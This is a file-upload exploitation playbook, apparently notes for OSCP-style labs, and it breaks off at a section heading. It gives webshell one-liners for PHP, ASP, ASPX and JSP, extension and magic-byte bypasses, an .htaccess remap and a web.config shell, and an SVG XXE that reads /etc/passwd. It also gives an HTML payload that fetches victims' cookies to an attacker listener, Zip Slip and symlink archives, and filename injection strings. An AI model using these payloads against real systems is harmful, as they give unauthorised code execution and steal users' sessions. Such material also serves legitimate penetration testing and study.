
> **STATUS: AUDITED** — first-principles + primary-source derivation (OWASP WSTG-BUSL-09 "Test Upload of Malicious Files", PortSwigger "File upload vulnerabilities", HackTricks "File Upload", PayloadsAllTheThings "Upload Insecure Files"); curl `-F` wire format, `${VAR:+-b "$VAR"}` conditional cookie handling, `HIDDEN_FLAGS[@]` array expansion, printf `%%` escape for ASP/JSP payloads, and GIF87a magic-byte survival through `file(1)` all sandbox-verified. Live-validation partial — THM:Guided Pentest: Web (RecruitX) exercised pre-flight, Section 2a alt-extension bypass, Verify RCE, and Reverse shell upgrade end-to-end (RCE via `.phtml`, foothold, flag). Sections 2b/2c/2d/3/4/5/6/7 remain structural audit only, unvalidated pending future targets hitting their branches.

Upload a file the app didn't want you to upload, then reach and execute it. Two orthogonal problems: **delivery** (get bytes past validation) and **execution** (get those bytes triggered as code). Both must succeed for RCE; non-RCE payloads (SVG XSS, filename injection) need only delivery. Entry from [[Web Attack Checksheet]] sub-block 1.10 (unauth) and [[Authenticated Walk]] sub-blocks 4 & 5 (authed).

⚠️ Delivery ≠ execution. A `200 OK` upload response does not prove RCE. Every SUCCESS branch in Sections 1-5 routes through [[#Verify RCE]] before earning "foothold".

---

## Pre-flight (per upload endpoint)

Fires per URL from caller. Loop by hand — one URL, walk pre-flight + attempt sections, on hit chain to Verify RCE, next URL.

### Variables

#### Set at paste time (F&R from caller + inspection):

`HOST='<host>'` 
`PORT='<port>'`

`UPLOAD_FORM_PATH='<upload_form_path>'`

`<upload_form_path>` = the URL where the caller observed `<input type=file>` (e.g. `/`, `/profile.php`, `/admin/upload.php`, `/support/ticket/new`). WAC 1.10 unauth callers most often pass `/`; AW callers pass the crawl-discovered path.

#### Derive `SERVER_STACK` and `SHELL_EXT` from `services_<ip>.txt`:

`grep '^<port>/open' services_<ip>.txt`

Field 5 tokens → `SERVER_STACK`:

- `PHP` / `Apache` / `nginx` (Linux, no ASP/Java) → `php`
- `Microsoft-IIS` / `ASP.NET` → `asp` (Section 1 payload) or `aspx` (Section 1 alternate payload)
- `Tomcat` / `Jetty` / `JBoss` / `Coyote` → `jsp`
- `Node` / `Express` / `nodejs` → `node`
- Ambiguous or absent → default to `php` (statistical majority in OSCP+/CTF); fall through to other stacks if PHP variants all reject.

`SHELL_EXT` matches `SERVER_STACK`: `php` / `asp` / `aspx` / `jsp`.

#### Statefulness — run Probe on both caller paths:

Run Statefulness Probe against `$UPLOAD_FORM_PATH` regardless of caller. The Probe fetches the form anon (takes no `--cookies` arg):

`~/scripts/statefulness_probe.sh --host=<host> --port=<port> --path=<upload_form_path>`

Route on `ROUTE:` marker (applies to both caller paths):

- `ROUTE: shell` → proceed.
- `ROUTE: burp` → rotating cookies or rotating hidden fields; escalate to `[[Burp File Upload]]` (build-when-encountered; see ⚠️ below).
- `BAIL: <reason>` → per WAC 1.6 conventions.
- `RATE_LIMITED: <detail>` → re-run with higher `--delay=<ms>`.

#### Session cookie + hidden fields — branch by caller:

Run the appropriate branch — **Unauth** or **Auth** — per caller. One cookie source per path; never both.

###### Unauth caller (WAC 1.10) — consume Probe emissions directly:

(`~/scripts/statefulness_probe.sh --host=<host> --port=<port> --path=<upload_form_path>`)

```bash
COOKIES='<STATIC_COOKIES value>'                       # e.g. PHPSESSID=abc; xsrf=def — anon session state
UPLOAD_STATIC_HIDDEN_FIELDS='<STATIC_HIDDEN_FIELDS value>'   # raw &-separated name=value pairs, e.g. csrf_token=abc123
EXTRA_HEADERS='<operator-supplied>'                    # JS-set headers the Probe cannot see; empty if none
```

###### Auth caller (AW sub-blocks 4/5) 

The Probe's emitted values are anon; the AW walk needs authed values. Discard Probe values, keep Probe classification only. Re-fetch the form with the AW cookie to capture the authed session's current hidden-field values:

`curl -sL -b '<session_cookie>' "http://$HOST:$PORT$UPLOAD_FORM_PATH" | grep -oiE '<input[^>]*type=["'"'"']?hidden[^>]*>'`

Set (leave `UPLOAD_STATIC_HIDDEN_FIELDS` empty if no hidden inputs observed):

```bash
COOKIES='<session_cookie>'                             # from AW Setup — supersedes any anon state
UPLOAD_STATIC_HIDDEN_FIELDS='<hidden_name1>=<hidden_value1>&<hidden_name2>=<hidden_value2>'
EXTRA_HEADERS='<operator-supplied>'                    # as unauth branch; empty if none
```

#### Assemble `POST_FLAGS` and `GET_FLAGS` per V_S GET/POST doctrine:

POSTs to the upload form get browser-faithful UA + Referer + Origin; GETs (form-metadata fetch, OPTIONS probe, Verify RCE trigger, Retrieval-URL fallback, reverse shell trigger) get UA only.

```bash
POST_FLAGS=(
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'
  -H "Referer: http://$HOST:$PORT$UPLOAD_FORM_PATH"
  -H "Origin: http://$HOST:$PORT"
)
GET_FLAGS=(
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'
)
[ -n "$COOKIES" ] && POST_FLAGS+=(-b "$COOKIES") && GET_FLAGS+=(-b "$COOKIES")
[ -n "$EXTRA_HEADERS" ] && POST_FLAGS+=(-H "$EXTRA_HEADERS") && GET_FLAGS+=(-H "$EXTRA_HEADERS")
```

#### Derive form metadata (fetch page + inspect):

```bash
curl -sL "${GET_FLAGS[@]}" "http://$HOST:$PORT$UPLOAD_FORM_PATH" | grep -oiE '<(form|input)[^>]*>'
```

From output, set:

```bash
UPLOAD_FILE_FIELD='<upload_file_field>'               # name= of the type=file input
UPLOAD_FORM_ACTION='<upload_form_action>'             # action= of the <form>; if absent, use $UPLOAD_FORM_PATH
```

Resolve `UPLOAD_ENDPOINT` — the URL curl will POST to:

- `UPLOAD_FORM_ACTION` starts with `http://` or `https://` → `UPLOAD_ENDPOINT="$UPLOAD_FORM_ACTION"`
- `UPLOAD_FORM_ACTION` starts with `/` → `UPLOAD_ENDPOINT="http://$HOST:$PORT$UPLOAD_FORM_ACTION"`
- `UPLOAD_FORM_ACTION` starts with anything else, i.e. does not start with leading forward-slash or scheme, OR is empty → `UPLOAD_ENDPOINT="http://$HOST:$PORT$UPLOAD_FORM_PATH"`

#### Convert `UPLOAD_STATIC_HIDDEN_FIELDS` to multipart `-F` array:

The Probe emits hidden fields as `&`-separated `name=value` pairs (POST-body format). File uploads use multipart, which needs each field as a separate `-F` flag:

```bash
HIDDEN_FLAGS=()
if [ -n "$UPLOAD_STATIC_HIDDEN_FIELDS" ]; then
  IFS='&' read -ra hidden_pairs <<< "$UPLOAD_STATIC_HIDDEN_FIELDS"
  for pair in "${hidden_pairs[@]}"; do
    [ -n "$pair" ] && HIDDEN_FLAGS+=(-F "$pair")
  done
fi
```

Empty `HIDDEN_FLAGS` if the Probe forwarded no hidden fields — array expands to nothing in `try_upload`.

⚠️ `[[Burp File Upload]]` playbook body — build-when-encountered. Dispatch here comes from Statefulness Probe `ROUTE: burp` (rotating cookies / rotating hidden fields — shell path can't refresh mid-multipart-POST). Points to include on build: (1) Setup — Burp session-handling chain per [[Automating Fresh State in Burp]] using `ROTATING_*` + `NEW_*_GET2` marker names; (2) Attack shape — Repeater for one-off shell attempts across Sections 1-6, since file upload attempt count is small (~20 max); (3) Payload files staged locally, attached via Repeater's file-attach; (4) Build trigger — first real-target encounter emitting `ROUTE: burp` against an upload form.

### Helper — bind reused upload command

Define once in the current shell (dies with the shell — re-define on new terminal):

```bash
try_upload() {
  curl -isX POST "${POST_FLAGS[@]}" "${HIDDEN_FLAGS[@]}" \
    -F "$UPLOAD_FILE_FIELD=@$1;filename=\"$2\";type=$3" \
    "$UPLOAD_ENDPOINT" \
    | tee /tmp/last_upload_response.html \
    | sed -e '/<style/,/<\/style>/d' -e '/<script/,/<\/script>/d'
}
```

Call as `try_upload <local_path> <remote_filename> <content_type>`.

Mechanics: `-i` includes response headers (surfaces `Location:` redirects). `"${POST_FLAGS[@]}"` array-expands each element quoted individually — carries browser-faithful UA + Referer + Origin + Cookie + any extra header the operator flagged, all assembled in pre-flight. `"${HIDDEN_FLAGS[@]}"` carries the Probe-forwarded static hidden fields (CSRF token, etc.). Filename value wrapped in escaped double-quotes (`filename=\"$2\"`) — required so remote filenames containing `;` (e.g. `shell.php;jpg`) aren't truncated by curl's `-F` semicolon parser.

### Response oracle

Every upload attempt in Sections 1-5 returns the server's response (headers + body). Eyeball for one of:

- Retrieval URL echoed in response body (`href=`, `src=`, JSON `"url":`, redirect `Location:` header) → **ACCEPTED** → capture URL, jump to [[#Verify RCE]]
- Error text (`invalid`, `not allowed`, `rejected`, `must be image`, `file too large`) → **REJECTED** → next attempt
- Empty / 302 / no signal → **UNCLEAR** → run [[#Retrieval-URL fallback]] to locate the file; if found, [[#Verify RCE]], else treat as REJECTED

---

## 1. Naive shell — direct + Content-Type spoof

Zero-restriction test. Any app with client-side-only validation or no server-side validation folds here. ~30 seconds total.

### Prepare the payload for the stack:

- `php` — 
  `printf '<?php system($_GET["cmd"]); ?>' > /tmp/shell.$SHELL_EXT`

- `asp` (classic ASP; single-line via printf `%%` escape) — 
  `printf '<%% Response.Write CreateObject("WScript.Shell").Exec("cmd.exe /c "&Request("cmd")).StdOut.ReadAll() %%>' > /tmp/shell.$SHELL_EXT`

- `aspx` — 
  `printf '<%%@ Page Language="C#" %%><%% var p=new System.Diagnostics.Process(); p.StartInfo.FileName="cmd.exe"; p.StartInfo.Arguments="/c "+Request["cmd"]; p.StartInfo.UseShellExecute=false; p.StartInfo.RedirectStandardOutput=true; p.Start(); Response.Write(p.StandardOutput.ReadToEnd()); %%>' > /tmp/shell.$SHELL_EXT`

- `jsp` — 
  `printf '<%% Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",request.getParameter("cmd")}); java.io.BufferedReader r = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream())); String l; while ((l = r.readLine()) != null) out.println(l); %%>' > /tmp/shell.$SHELL_EXT`

Verify:

`cat /tmp/shell.$SHELL_EXT`

All four payloads write command output to the HTTP response body — `Verify RCE` matches on `uid=` (Unix) or command-echoed text.

⚠️ For `node`: no self-contained one-liner webshell — Node RCE via upload usually requires a framework CVE. Skip Section 1 for `node`; jump to Section 7.

### Fire three attempts, each differing only in content-type:

```bash
try_upload /tmp/shell.$SHELL_EXT shell.$SHELL_EXT application/octet-stream
try_upload /tmp/shell.$SHELL_EXT shell.$SHELL_EXT image/jpeg
try_upload /tmp/shell.$SHELL_EXT shell.$SHELL_EXT image/gif
```

Route per response (assess each):

- ACCEPTED with retrieval URL → [[#Verify RCE]]
- All REJECTED → Section 2
- ACCEPTED but "file quarantined" / "pending scan" / delay → Section 7 (race condition candidate)

---

## 2. Extension bypass

Server validates by extension. Iterate through parser-discrepancy variants for `$SERVER_STACK`.

### 2a. Alternate executable extensions

Blacklist-based validators typically miss less-common handlers. Prepare one shell per candidate extension, upload:

```bash
ALT_EXT_LIST=(<space-separated alt extensions per SERVER_STACK, see below>)
for alt_ext in "${ALT_EXT_LIST[@]}"; do
  cp /tmp/shell.$SHELL_EXT /tmp/shell.$alt_ext
  echo "=== $alt_ext ==="
  try_upload /tmp/shell.$alt_ext shell.$alt_ext application/octet-stream 2>&1 | grep -iE '^HTTP/|^Location:|alert|error|success|uploaded|invalid|not allowed|rejected|href=[^>]*upload|src=[^>]*upload'
done
```

`ALT_EXT_LIST` per `$SERVER_STACK` (all values validated against HackTricks / PayloadsAllTheThings extension lists):

- `php` → `php3 php4 php5 php7 php8 pht phtm phtml phar phps pgif inc hphp ctp module`
- `asp` → `asp aspx config ashx asmx aspq axd cshtm cshtml rem soap vbhtm vbhtml asa cer shtml`
- `jsp` → `jsp jspx jsw jsv jspf wss do action`

Route per response as oracle. Any ACCEPTED + retrieval URL → [[#Verify RCE]] with the list of accepted uploaded files. All REJECTED → 2b.

### 2b. Case variants

Case-insensitive server config + case-sensitive blacklist = bypass.

```bash
for case_var in pHp PhP PHP5 pHar PhTmL AsPx JsP; do
  cp /tmp/shell.$SHELL_EXT /tmp/shell.$case_var
  echo "=== $case_var ==="
  try_upload /tmp/shell.$case_var shell.$case_var application/octet-stream 2>&1 | head -5
done
```

Any ACCEPTED → [[#Verify RCE]]. All REJECTED → 2c.

### 2c. Double / reverse-double extensions

Apache mis-configs execute `.php.jpg` (multi-extension MIME dispatch); some parsers execute `.jpg.php` because they resolve on the LAST dot; some on the FIRST.

```bash
for double_name in shell.$SHELL_EXT.jpg shell.jpg.$SHELL_EXT shell.png.$SHELL_EXT shell.$SHELL_EXT.png; do
  try_upload /tmp/shell.$SHELL_EXT "$double_name" application/octet-stream 2>&1 | head -5
  echo "=== $double_name done ==="
done
```

Any ACCEPTED → [[#Verify RCE]]. All REJECTED → 2d.

### 2d. Trailing / obfuscation characters

Extension parsers on the server side often strip trailing characters differently than the validator sees them.

```bash
for trail_name in 'shell.<shell_ext>.' 'shell.<shell_ext>%20' 'shell.<shell_ext>%00.jpg' 'shell.<shell_ext>%0a' 'shell.<shell_ext>/' 'shell.<shell_ext>::$DATA' 'shell.<shell_ext>.\' 'shell.p.phphp' ; do
  try_upload /tmp/shell.$SHELL_EXT "$trail_name" application/octet-stream 2>&1 | head -5
  echo "=== $trail_name done ==="
done
```

⚠️ Replace `<shell_ext>` in the loop's string list with the concrete extension (F&R after paste — the loop values are literal strings; `$SHELL_EXT` bash-expansion doesn't fire inside single quotes).

Notes on specific variants:

- `shell.php.` — some parsers strip trailing dot; extension check sees `.` (empty), storage keeps `.php.` but downstream handlers may normalize back to `.php`.
- `shell.php%00.jpg` — URL-encoded null. Works only against servers that URL-decode the filename before extension check but not before storage. For a raw NUL byte (`shell.php\x00.jpg`), curl `-F` does not decode `%00` to a null byte — use Burp Repeater to inject the raw byte, or wire the multipart body manually.
- `shell.p.phphp` — stripping-recursion bypass specific to `.php`-blacklist strip-and-continue implementations. After stripping the first `.php` occurrence at position 9-12, `shell.p` + `hp` = `shell.php`. Adapt for other stacks by finding a strip that leaves the target extension.
- `shell.asp::$DATA` — NTFS Alternate Data Stream, Windows/IIS-specific. Skip if `SERVER_STACK` = `php` / `jsp` on Linux.

Any ACCEPTED → [[#Verify RCE]]. All REJECTED → Section 3.

---

## 3. Content bypass (magic bytes / image parse)

Server validates file *content* (magic bytes via `file(1)` / `libmagic`, or `getimagesize()`, or image decoder). Wrap payload in valid image.

### 3a. GIF87a prepend (cheapest)

6-byte GIF header at file start; anything after can be arbitrary bytes. Passes `file(1)` and most naive validators.

```bash
printf 'GIF87a;\n<?php system($_GET["cmd"]); ?>' > /tmp/shell_gif.$SHELL_EXT
file /tmp/shell_gif.$SHELL_EXT
```

Confirm output includes `GIF image data`, then upload with an executable extension (from Section 2 findings — the extension the server DID accept, or fall back to `$SHELL_EXT`):

```bash
try_upload /tmp/shell_gif.$SHELL_EXT shell.$SHELL_EXT image/gif
```

⚠️ Payload above is PHP-specific. For ASP/JSP substitute the corresponding stack payload from Section 1's Prepare block.

Any ACCEPTED → [[#Verify RCE]]. REJECTED → 3b.

### 3b. Real-image + appended payload (survives image parse)

Genuine JPEG with payload appended after the JPEG EOI marker. Passes `getimagesize()`, most image-decoder validators (including PHP-GD when it doesn't re-encode), and header/magic-byte checks.

```bash
convert -size 10x10 xc:white /tmp/legit.jpg
cat /tmp/legit.jpg > /tmp/shell_polyglot.jpg
printf '\n<?php system($_GET["cmd"]); ?>\n' >> /tmp/shell_polyglot.jpg
file /tmp/shell_polyglot.jpg
grep -a 'system' /tmp/shell_polyglot.jpg
```

Confirm `file` reports `JPEG image data` AND `grep` finds the payload intact, then upload:

```bash
try_upload /tmp/shell_polyglot.jpg shell.$SHELL_EXT image/jpeg
```

⚠️ If the server *re-encodes* the image (`imagecopyresized` / `imagecopyresampled` / `thumbnailImage`), the appended-payload bytes are stripped. Skip to 3c or route via a resize-surviving PNG chunk technique (PLTE / IDAT / tEXt — build-when-encountered; see [Synacktiv payloads](https://github.com/synacktiv/astrolock)).

Any ACCEPTED → [[#Verify RCE]]. REJECTED → 3c.

### 3c. EXIF metadata injection

Payload embedded in a valid image's EXIF `Comment` field. Passes strict content validators including some image re-encoders that preserve metadata. Execution requires LFI chain (server serves the file as an image but doesn't execute it → include the image from a PHP context that runs it).

⚠️ Requires `exiftool` — preinstalled on Kali. If missing on your attack box: `sudo apt install -y libimage-exiftool-perl`.

```bash
convert -size 110x110 xc:white /tmp/shell_exif.jpg
exiftool -Comment='<?php system($_GET["cmd"]); ?>' /tmp/shell_exif.jpg
exiftool /tmp/shell_exif.jpg | grep -i comment
```

Confirm `Comment` field contains the payload, then upload:

```bash
try_upload /tmp/shell_exif.jpg shell_exif.jpg image/jpeg
```

Route:

- ACCEPTED + retrieval URL AND target has an [[Local File Inclusion]] surface elsewhere → chain: LFI(uploaded image path) → RCE. Route to [[Local File Inclusion]] with `<lfi_target>` = the uploaded image URL.
- ACCEPTED without LFI surface → delivery-only artifact; no direct RCE here → Section 4.
- REJECTED → Section 4.

---

## 4. Configuration file drop

Server accepts extensions we don't need but rejects our shell extension. Drop a server-configuration file that re-maps a permitted extension to the script handler.

### 4a. Apache — `.htaccess`

```bash
printf 'AddType application/x-httpd-php .fasjkl\n' > /tmp/.htaccess
try_upload /tmp/.htaccess .htaccess text/plain
```

If ACCEPTED, prepare shell with the re-mapped extension:

```bash
cp /tmp/shell.$SHELL_EXT /tmp/shell.fasjkl
try_upload /tmp/shell.fasjkl shell.fasjkl application/octet-stream
```

Any ACCEPTED → [[#Verify RCE]] using `shell.fasjkl` as the trigger filename.

⚠️ `.fasjkl` is arbitrary — any string not on the app's extension blacklist works. Change if `.fasjkl` is somehow blocked.

⚠️ Applies per-directory. `.htaccess` uploaded to `/uploads/` re-maps only `/uploads/*.fasjkl` — the retrieval URL must be under the same directory.

⚠️ Effective only if the target uses Apache AND `AllowOverride` includes `FileInfo` for the upload dir AND `mod_php` is loaded server-wide. Reject means either not Apache, not overriding, `.htaccess` blocked by name, or PHP module absent.

### 4b. IIS — `web.config`

```bash
cat > /tmp/web.config <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
    </handlers>
    <security>
      <requestFiltering>
        <fileExtensions>
          <remove fileExtension=".config" />
        </fileExtensions>
        <hiddenSegments>
          <remove segment="web.config" />
        </hiddenSegments>
      </requestFiltering>
    </security>
  </system.webServer>
</configuration>
<% Response.Write("web.config RCE ") : Response.Write(Server.CreateObject("WScript.Shell").Exec("cmd.exe /c " & Request.QueryString("cmd")).StdOut.ReadAll()) %>
EOF
try_upload /tmp/web.config web.config application/xml
```

Any ACCEPTED → the `web.config` itself is the shell. Trigger:

```bash
curl -sG "http://$HOST:$PORT/<retrieval_url_dir>/web.config" --data-urlencode "cmd=whoami"
```

`<retrieval_url_dir>` is the directory `web.config` landed in (from ACCEPTED response inspection).

⚠️ Applies only if `SERVER_STACK` = `asp` (IIS). Skip on PHP / JSP / Node.

⚠️ `preCondition="bitness64"` binds to 64-bit IIS workers. If the target runs 32-bit workers, remove that attribute or change to `bitness32`. `asp.dll` is classic ASP — missing on IIS installs without the ASP feature enabled. If web.config uploads but the shell 404s, IIS may have rejected the handler config — try removing the `preCondition` attribute and re-uploading.

REJECTED both 4a/4b → Section 5.

---

## 5. PUT direct upload

HTTP `PUT` writes the request body to a server path. Rare but occasional on WebDAV-enabled endpoints or misconfigured static-file servers.

Probe common upload / static-file directories for PUT support:

```bash
for probe_dir in / /uploads/ /files/ /media/ /attachments/ /images/ /static/ /storage/ /webdav/ /dav/; do
  allow=$(curl -sI -X OPTIONS "${GET_FLAGS[@]}" "http://$HOST:$PORT$probe_dir" | grep -i '^Allow:')
  echo "$probe_dir -> ${allow:-(no Allow header)}"
done
```

Route per output:

- Any line contains `Allow:` header including `PUT` → attempt direct upload to that dir:

    ```bash
	curl -isX PUT "${POST_FLAGS[@]}" \
      --data-binary @/tmp/shell.$SHELL_EXT \
      "http://$HOST:$PORT<put_dir>shell.$SHELL_EXT"
    ```

    Substitute `<put_dir>` = the directory where OPTIONS returned `Allow: PUT`. 201 / 200 / 204 → uploaded → [[#Verify RCE]] with retrieval URL `http://$HOST:$PORT<put_dir>shell.$SHELL_EXT`.

- No `Allow:` header contains `PUT`, all rows show `(no Allow header)` or 405 → PUT not permitted → Section 6.

---

## 6. Non-RCE payloads

Delivery works; execution as server-side code doesn't. Chain the upload to other attack classes.

### 6a. SVG — XSS + XXE

Prepare and upload:

```bash
cat > /tmp/x.svg <<'EOF'
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <script type="text/javascript">alert('XSS: ' + document.cookie);</script>
</svg>
EOF
try_upload /tmp/x.svg x.svg image/svg+xml
```

Verify in Firefox: open the retrieval URL for `x.svg` with your session cookies set (Firefox DevTools → Storage → Cookies → add each `$COOKIES` entry for the target host if not already present). If `alert(document.domain)` fires → **XSS confirmed** on same origin as the app.

Route:

- Alert triggers → session cookie exfiltration → [[Session Cookie Attacks]].
- SVG renders sanitised (no script execution) → XSS blocked; try XXE variant below.
- REJECTED → try filename variants (`x.svg.xml`, `x.SVG`) then 6b.

XXE variant (server parses the SVG as XML somewhere in the pipeline):

```bash
cat > /tmp/x_xxe.svg <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
EOF
try_upload /tmp/x_xxe.svg x_xxe.svg image/svg+xml
```

If the SVG is later rendered / OCRed / thumbnailed and `<text>` reflected somewhere accessible → `/etc/passwd` disclosed. Route to XXE playbook (build-when-encountered).

### 6b. HTML — XSS + open redirect

Prepare attacker HTTP listener first (any of):

- `python3 -m http.server 8000` (attacker box)
- `nc -lvnp 8000` (attacker box) 

Then:

```bash
cat > /tmp/x.html <<EOF
<html><body><script>fetch('http://<attacker_ip>:8000/?c='+document.cookie)</script></body></html>
EOF
try_upload /tmp/x.html x.html text/html
```

ACCEPTED + `http://$HOST:$PORT/<retrieval_url>/x.html` served AND on same origin as the app → any authed user visiting the URL leaks their cookie to attacker listener. Watch listener output for the exfil request.

⚠️ Cross-origin: if the retrieval URL is on a subdomain / different host (`cdn.<host>` / signed S3 URL), same-origin policy blocks the XSS attack — the script runs but can't read the app's cookies. Log delivery-only, no XSS foothold.

### 6c. Malicious ZIP (extraction-driven)

Fires only if the app extracts uploaded ZIPs (upload feature says "extract archive" / "batch import" / "restore backup"). Two payloads:

Symlink attack — read arbitrary file on server:

```bash
ln -s /etc/passwd /tmp/link.txt
zip --symlinks /tmp/pl.zip /tmp/link.txt
try_upload /tmp/pl.zip pl.zip application/zip
```

After extraction, retrieve `link.txt` via the app's normal file-view path → contains `/etc/passwd` contents (if the server follows symlinks — default Apache/nginx behavior with `FollowSymLinks`).

Zip Slip — write outside extraction directory:

```bash
mkdir -p /tmp/zs/a/b/c
echo 'base' > /tmp/zs/a/b/c/base
echo '<?php system($_GET["cmd"]); ?>' > /tmp/zs/traversed.php
(cd /tmp/zs/a/b/c && zip /tmp/slip.zip base ../../../../../../../../var/www/html/traversed.php)
try_upload /tmp/slip.zip slip.zip application/zip
```

If extraction is naive → `traversed.php` lands at (or near) `/var/www/html/`. The many `../` prefixes are for portability across extraction depths — the extractor stops at filesystem root, then follows the absolute-like suffix.

If `traversed.php` landed in a web-served dir → [[#Verify RCE]] with retrieval URL `http://$HOST:$PORT/traversed.php` (adjust for actual webroot). Otherwise inspect extraction output for actual landing path.

### 6d. Filename injection into a sink (SQL / shell / XSS)

Filename is reflected in another sink — SQL query, log file, shell command, HTML output. Vary filename to inject non-destructive detection payloads:

```bash
# Time-based SQL injection (non-destructive — no data mutation)
try_upload /tmp/legit.jpg "'||sleep(3)||'.jpg" image/jpeg          # MySQL
try_upload /tmp/legit.jpg "'||pg_sleep(3)||'.jpg" image/jpeg       # PostgreSQL

# Time-based command injection (non-destructive)
try_upload /tmp/legit.jpg "'; sleep 10 #.jpg" image/jpeg

# Stored XSS via filename reflection
try_upload /tmp/legit.jpg '<svg onload=alert(1)>.jpg' image/jpeg
```

Route:

- Response delay ~3s / ~10s on time-based payloads → SQL or command injection confirmed → route to [[Injection]] for full exploitation. Establish the injection ORACLE via time delay first; only escalate to non-time-based UNION / stacked / write payloads AFTER real-engagement approval.
- SQLi error page reveals SQL error → route to [[Injection]] SQL branch.
- XSS payload rendered on any subsequent page (file list, admin dashboard) → route to [[Session Cookie Attacks]].

⚠️ Payloads above are DETECTION-only. Do NOT use `'; DROP TABLE users; --` or equivalent destructive SQL — CTF lab it may work but breaks the box for others; real engagement it's catastrophic without written approval.

### 6e. Filename as path traversal — write outside upload dir

Filename doubles as a filesystem path fragment. Attempts to escape the upload directory.

```bash
try_upload /tmp/shell.$SHELL_EXT "../../../../../../var/www/html/shell.$SHELL_EXT" application/octet-stream
```

Route:

- ACCEPTED + no error → probe expected traversal target:

    ```bash
    curl -s "http://$HOST:$PORT/shell.$SHELL_EXT"
    ```

    If retrievable at unexpected path → [[#Verify RCE]] with that URL. If not retrievable, filename may have been sanitized to strip `../`.

- REJECTED → traversal path blocked at extension or filesystem-permission layer → skip.

⚠️ Path targets vary per stack (Apache webroot commonly `/var/www/html/`; IIS `C:\inetpub\wwwroot\`; Tomcat `webapps/ROOT/`). Multiple `../` prefixes are portable — filesystem root truncates the escape at `/`, then absolute-like suffix routes into the target dir.

---

## 7. Build-when-encountered

Unbuilt stubs — build first-principles + primary-source on first real target that fires the condition.

- **Race condition** (upload-then-scan-then-delete window): stub. Trigger when target shows accept → delay → 404 pattern on subsequent GET. Race the delete via fetch loop while re-uploading. Reference: PortSwigger "Exploiting file upload race conditions".
- **URL-based upload race** (server fetches attacker-supplied URL, stores to randomised temp dir, validates): stub. Trigger when upload form accepts `url=<attacker_http>` instead of file. Brute-force the temp dir name (often `uniqid()`-based, weak).
- **Polyglot files** (GIFAR, PHAR+JPG): stub. Trigger when target processes uploaded files with format-specific parsers that disagree (Java + GIF, PHP + PHAR).
- **Framework-specific upload CVEs** (ImageTragik CVE-2016-3714, ImageMagick CVE-2022-44268, UniSharp LFM CVE-2024-21546, uWSGI RCE, Gibbon LMS CVE-2023-45878): route via [[Web Attack Checksheet#Version-discovery route]] → `searchsploit_ladder.sh` on the identified image / upload library.
- **Ruby on Rails Active Storage + libvips parser confusion** (CVE-2026-66066 and kin): stub. Trigger when target is Rails + accepts image-shaped uploads AND uses Active Storage direct uploads.
- **ZIP NUL-byte filename smuggling / stacked ZIPs**: stub. Trigger when ZIP validation and ZIP extraction use different libraries in the target stack.
- **Server-side wget URL-download with filename truncation**: stub. Trigger when upload feature accepts URL and internally uses `wget` (Server header hints, sometimes `X-Powered-By`).
- **PNG chunk-embedded payloads that survive resize** (PLTE / IDAT / tEXt): stub. Trigger when Section 3b fails specifically because server re-encodes images via PHP-GD. Reference: Synacktiv `astrolock` payload generators.
- **Windows NTFS junction upload-dir escape**: stub. Trigger only with local access to a Windows target (see HackTricks reference).

---

## Verify RCE

Fires from Sections 1-5 on any ACCEPTED-with-retrieval-URL branch.

Set:

```bash
RETRIEVAL_PATH='<retrieval_path>' # accepted file path e.g. /uploads/documents/shell.phtml

CMD_PARAM='cmd'                                    # matches the `cmd` param the Section 1 payloads read from (e.g. PHP's $_GET["cmd"], ASP's Request("cmd"), JSP's request.getParameter("cmd")); change only if triggering a custom shell that reads a different param
```

Fire:

```bash
curl -sG "${GET_FLAGS[@]}" "http://$HOST:$PORT${RETRIEVAL_PATH:?set RETRIEVAL_PATH first e.g. RETRIEVAL_PATH=/uploads/documents/shell.phar}" --data-urlencode "cmd=id" \
  | grep -oE 'uid=[0-9]+\([^)]*\)|<title>[^<]*</title>|<\?php[^?]*\?>|<%[^%]*%>'
```

Route on grep output:

- Contains `uid=<n>(<name>) gid=<n>(<name>)` → **RCE CONFIRMED**. Continue to [[#Reverse shell upgrade]].
- Contains verbatim source (e.g. `<?php system($_GET["cmd"]); ?>`) → shell delivered but NOT executed. Server serves the file as static content, not script. Two remedies: (a) go back to Section 2 with different extension (the current one isn't in the executable-handler list); (b) go to Section 4 (drop config file to re-map extension).
- 404 → uploaded filename isn't at expected URL. Fall through to [[#Retrieval-URL fallback]].
- 200 + empty body → executes but `id` produced no visible output OR the payload didn't parse. Try `--data-urlencode "$CMD_PARAM=whoami"` (single-word output). Still empty → confirm the payload landed byte-intact via `curl -s "${GET_FLAGS[@]}" "http://$HOST:$PORT$RETRIEVAL_PATH"` and grep for payload signature (e.g. `system(` for PHP, `Runtime.getRuntime` for JSP).
- 403 / 401 → retrieval URL requires session state the caller isn't holding, or requires different auth tier than the upload path. If AW caller: re-check `$COOKIES` is fresh (may have expired) and re-assemble `GET_FLAGS`; if unauth caller: the upload dir may be authed-only for reads → chain via authed callback later.

### Fire arbitrary commands (optional — skip if going straight to reverse shell upgrade):

Once RCE is confirmed, run further commands without the classification grep — raw output is what you want at this point:

```bash
curl -sG "${GET_FLAGS[@]}" "http://$HOST:$PORT$RETRIEVAL_PATH" --data-urlencode "cmd=<command>"
```

Substitute `<command>` per what you need. Useful ones:
- `hostname` — target's hostname
- `uname -a` — kernel + arch
- `ls -la /home` — user directories
- `cat /etc/passwd` — full user list
- `pwd` — current working dir of the web server process
- `find / -perm -4000 2>/dev/null` — SUID binaries (privesc recon)

### Retrieval-URL fallback
